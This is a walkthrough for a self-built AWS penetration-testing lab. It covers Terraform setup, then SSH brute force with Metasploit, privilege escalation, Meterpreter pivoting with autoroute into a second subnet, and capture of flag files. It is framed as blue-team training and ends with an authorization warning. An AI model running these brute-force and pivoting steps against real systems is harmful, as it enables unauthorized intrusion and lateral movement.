# **Walkthrough: Simulating Penetration Testing in an Isolated Network Environment on AWS**

#### **Prerequisites**
- **AWS Account**: Ensure you have a new AWS account set up for this exercise (do not use a production environment).
- **Terraform**: Install and configure Terraform.
- **CloudShell**: AWS CloudShell will be used to execute commands.

---

## Detailed Overview of the Pivoting Lab

### Objectives:
The primary goal of this lab is to provide a safe environment for blue team cybersecurity professionals to:
- Learn and practice pivoting techniques, a critical skill in lateral movement.
- Detect and mitigate attacks that involve moving between machines within the internal network.
- Gain hands-on experience by simulating real-world adversarial attacks in a cloud-based environment.

### Setup Instructions:
For a detailed step-by-step guide to setting up the lab environment, refer to the following sections:
- [Setup Instructions](./setup.md): Detailed setup for creating an AWS account, securing IAM users, and installing Terraform and Ansible.
- [Terraform Documentation](./terraform.md): Block-by-block explanation of the Terraform configuration that automates the lab setup.

---

### **Step 1: Install Terraform**

1. **Clone the tfutils/tfenv repository:**
   - In the AWS CloudShell terminal clone and install the tfutils/tfenv repository to our CloudShell environment:
     ```bash
     git clone https://github.com/tfutils/tfenv.git ~/.tfenv
     mkdir ~/bin
     ls -hF ~/.tfenv/bin/
     ln -s ~/.tfenv/bin/* ~/bin/
     readlink -f ~/bin/*
     tfenv install 1.3.9
     tfenv use 1.3.9
     terraform --version
     ```

### **Step 2: Setting Up the Lab Environment with Terraform**

1. **Download and Extract Lab Files:**
   - Open **CloudShell** and Download the Terraform files for the lab from the book’s GitHub repository:
     ```bash
     mkdir -p pentest_lab && cd pentest_lab
     wget -O pentest_lab.zip https://github.com/terlbrown/detection-lab/raw/main/scripts/pentest_lab.zip
     unzip pentest_lab.zip
     rm pentest_lab.zip
     ```

2. **Initialize Terraform:**
   - Initialize the Terraform environment:
     ```bash
     terraform init
     ```
3. **Preview Terraform Configuration:**
   - Create the environment:
     ```bash
     terraform plan
     ```

4. **Apply Terraform Configuration:**
   - Create the environment:
     ```bash
     terraform apply -auto-approve
     ```

4. **Output Details:**
   - Copy the public and private IP addresses of the EC2 instances from the output.

---

### **Step 3: Validating Network Connectivity**

1. **Ping Test (Target VM 1):**
   - Use **EC2 serial console** and connect into the **Kali VM**:
     - Navigate to the EC2 console
     - Select vm-kali
     - Click the Connect button
     - NOTE: If you are seeing a blank black screen, simply press the Enter key to see the root@kali:~# command prompt.
   - Run a ping test to check connectivity to the first target VM:
     ```bash
     ping <TARGET_VM_01_PRIVATE_IP>
     ```
   - Run a ping test to check connectivity to the second target VM:
     ```bash
     ping <TARGET_VM_02_PRIVATE_IP>
     ```
   - Confirm that the second VM is unreachable from the Kali VM due to security group restrictions.

2. **Reachability from Target VM 1 to Target VM 2**
     - Use **EC2 Instance Connect** and connect to the **Target VM 1**
     - Attempt to ping the second target VM:
        ```bash
        ping <TARGET_VM_02_PRIVATE_IP>
        ```
   - Confirm that the second VM is reachable from the Target VM 1.

---

### **Step 4: Simulating Penetration Testing**

#### **Part 1: SSH Brute Force on Target VM 1**

1. **Run nmap in the Kali VM:**
   ```bash
   nmap --top-ports 1000 <TARGET_VM_01_PRIVATE_IP>
   ```
   - We should see that port 22 is open.

2. **Launch Metasploit in the Kali VM:**
   ```bash
   msfconsole
   ```

3. **Run SSH Brute-Force Attack:**
   - Set up the brute force attack against the first target VM:
     ```bash
     use auxiliary/scanner/ssh/ssh_login
     set USER_FILE /root/usernames.txt
     set PASS_FILE /root/passwords.txt
     set RHOSTS <TARGET_VM_01_PRIVATE_IP>
     set THREADS 1
     set VERBOSE true
     run
     ```

4. **Access the VM:**
   - Interact with the session:
     ```bash
     sessions
     sessions -i 1
     whoami
     ```

5. **Privilege Escalation:**
   - Elevate to root:
     ```bash
     sudo su
     whoami
     ```

6. **Obtain the First Flag:**
   - Search for the flag:
     ```bash
     find / -type f -name "flag*"
     cat /root/flag.txt
     ```

7. **Background Session 1:**
   - Press Ctrl + Z to run the session in background mode. When prompted with Background session 1? [y/N], enter y to proceed.
     - Important note: Ctrl + Z (background session) and not Ctrl + C (abort session).

---

#### **Part 2: Pivoting to Target VM 2**

1. **Set Up Meterpreter Session on Target VM 1:**
   - Upgrade to a Meterpreter session:
     ```bash
     sessions
     sessions -u 1
     sessions -i 2
     ```
   - Check network configuration on Target VM 2:
     ``` bash
     ipconfig
     ```
   - **Background Session 2**
     - Press Ctrl + Z to run the session in background mode. When prompted with Background session 1? [y/N], enter y to proceed.

2. **Set Up Route for Pivoting:**
   - Use the `autoroute` module to pivot from Target VM 1:
     ```bash
     use post/multi/manage/autoroute
     set SESSION 2
     set SUBNET 10.0.1.0/24
     run
     ```

3. **Port Scan Target VM 2:**
   - Scan for open ports on the second target VM:
     ```bash
     use auxiliary/scanner/portscan/tcp
     set RHOSTS <TARGET_VM_02_PRIVATE_IP>
     run
     ```

4. **SSH Brute Force on Target VM 2:**
   - Run the SSH login scanner:
     ```bash
     use auxiliary/scanner/ssh/ssh_login
     set RHOSTS <TARGET_VM_02_PRIVATE_IP>
     run
     sessions
     ```

5. **Obtain the Second Flag:**
   - Interact with the session and search for the second flag:
     ```bash
     sessions -i 3
     whoami
     sudo su
     whoami
     find / -type f -name "flag*"
     cat /root/flag.txt
     exit -y
     ```

# Congratulations!!! You completed the Pivoting Lab.

---

### **Step 5: Clean Up the Lab**

1. **Destroy Resources:**
   - After completing the simulation, run:
     ```bash
     terraform destroy -auto-approve
     ```

2. **Confirm Resource Deletion:**
   - Verify deletion by running:
     ```bash
     terraform show
     ```

---

### **Important Warnings and Notes**

- **Costs**: Ensure you clean up resources immediately after the lab to avoid unnecessary charges.
- **Security**: Only perform penetration testing in authorized environments. Attacking other resources is illegal.
- **Follow AWS Pricing**: Use the AWS Pricing Calculator to estimate lab costs.

---
